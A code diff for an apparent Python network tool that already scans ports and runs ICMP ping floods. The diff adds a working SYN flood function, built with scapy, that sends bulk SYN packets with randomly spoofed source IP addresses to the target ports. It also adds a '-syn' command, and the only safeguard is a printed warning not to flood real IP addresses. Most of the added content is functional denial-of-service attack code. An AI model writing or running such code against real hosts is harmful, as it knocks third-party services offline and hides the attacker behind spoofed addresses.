@@ -20,7 +20,8 @@ gathered from whois lookups @ https://www.ultratools.com/tools/ipWhoisLookup
 
 import sys
 import socket
-import scapy
+from scapy.all import *
+import random
 from multiprocessing import Pool
 from platform   import system as system_name  # Returns the system/OS name
 from subprocess import call   as system_call  # Execute a shell command
@@ -129,12 +130,73 @@ def ICMP_Ping_Flood(host, cmds):
 		print('something went wrong in ping flood ', e)
 		print('host and number of pings set: ', cmds)
 
+def randomIP():
+	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
+	return ip
+
+def randInt():
+	x = random.randint(0, 255)
+	return x
+
+def SynAckAttack(host, cmds):
+	"""
+	sends syn packets to the host_and_ports list
+	:return:
+	"""
+	print("\n###########################################")
+	print("# Starting SYN ACK Attack..")
+	print("###########################################\n")
+	# ports=[]
+	try:
+		amount = int(cmds[3])
+	except IndexError:
+		amount = 1
+	try:
+		ports = cmds[2]
+		ports = [int(p) for p in ports.split('.')]
+	except IndexError:
+		ports = []
+	except Exception as e:
+		print('in ping flood: ')
+		print('something was wrong with arguments: ', cmds)
+		print('\n', e)
+		return
+	# hosts = state.host_and_ports.keys()
+	# ports = []
+	if not ports:
+		print("***\n[e]: No ports were specifed, please enter them like so: 80,81,88,3000")
+		print("[cmds]: ", cmds)
+		print()
+		return
+	# for host in hosts:
+	print(f"# Attacking Target: {host}")
+	for hostPort in ports:
+		for x in range(0, amount):
+			# Build a random packet
+			s_port = randInt()
+			s_eq = randInt()
+			w_indow = randInt()
+
+			IP_Packet = IP()
+			IP_Packet.src = randomIP()
+			IP_Packet.dst = host
+
+			TCP_Packet = TCP()
+			TCP_Packet.sport = s_port
+			TCP_Packet.dport = hostPort
+			TCP_Packet.flags = "S"
+			TCP_Packet.seq = s_eq
+			TCP_Packet.window = w_indow
+
+			# Send the packet
+			send(IP_Packet/TCP_Packet)
+
 def scanning(args, state):
 	"""
 	scans host specified by user
 	saves the open ports discovered in State object
 	"""
-	host  = args[1]
+	host = args[1]
 	start_port = int(args[2])
 	end_port   = int(args[3])
 	assert start_port < end_port
@@ -184,18 +246,21 @@ def usage(print_code_name=True):
 	print("-h, -help	- print out the description of usage")
 	print("-s	        - scan a target host and a range of ports\n"
 			"            Requires three args, <host> and <port start> and <port end>")
-	print("-l              - list the sets of ports found open for all hosts scanned")
-	print("-pf             - flood a target host with an ICMP PING flood.\n" 
+	print("-l           - list the sets of ports found open for all hosts scanned")
+	print("-pf          - flood a target host with an ICMP PING flood.\n" 
 			"            Requires three args, <host> and <port start> and <port end>")
-	print("-a            - save hosts and open ports to a .txt file")
-	print("-r            - read in hosts and open ports from a .txt file")
+	print("-syn         - flood a target host with an SYN ACK flood.\n"
+		  "              Requires two arguments: <host>, <ports> in format of 'p1,p2,p3,...,pn'. Has optional third argument, <amount> ")
+	print("-a           - save hosts and open ports to a .txt file")
+	print("-r           - read in hosts and open ports from a .txt file")
 	print()
 	print()
 	print("Examples: ")
 
 	print("-l")
 	print("-s 192.168.0.1 0 500")
-	print("-pf 192.168.0.1   <num of pings>")
+	print("-pf  192.168.0.1   (optional) <num of pings>")
+	print("-syn 192.168.0.1   (optional) <num of pings>")
 
 	# sys.exit(0)
 
@@ -208,8 +273,8 @@ if __name__ == "__main__":
 	"""
 	state = State()
 	usage()
-	try:
-		while True:
+	while True:
+		try:
 			print("Enter a set of commands(hint, type -h or -help for help)""")
 			print("To quit, enter -q/-Q")
 			print()
@@ -227,6 +292,9 @@ if __name__ == "__main__":
 				# call for a ping flood
 				print("WARNING: make sure you're not actually flooding a 'real' IP address")
 				ICMP_Ping_Flood(cmds[1], cmds)
+			elif cmds[0] == '-syn':
+				print("WARNING: make sure you're not actually flooding a 'real' IP address")
+				SynAckAttack(cmds[1], cmds)
 			elif cmds[0] in ('-q', '-Q'):
 				sys.exit(0)
 			elif cmds[0] == '-a':
@@ -235,5 +303,10 @@ if __name__ == "__main__":
 				state.load()
 			else:
 				print("invalid arguments entered: %s" % cmds)
-	except Exception as e:
-		print (e)
+		except Exception as e:
+			print('\n\n')
+			print("***Something went wrong***")
+			print("[cmds]: ", cmds)
+			print("[e]: ", e)
+			print("***                    ***")
+			print()
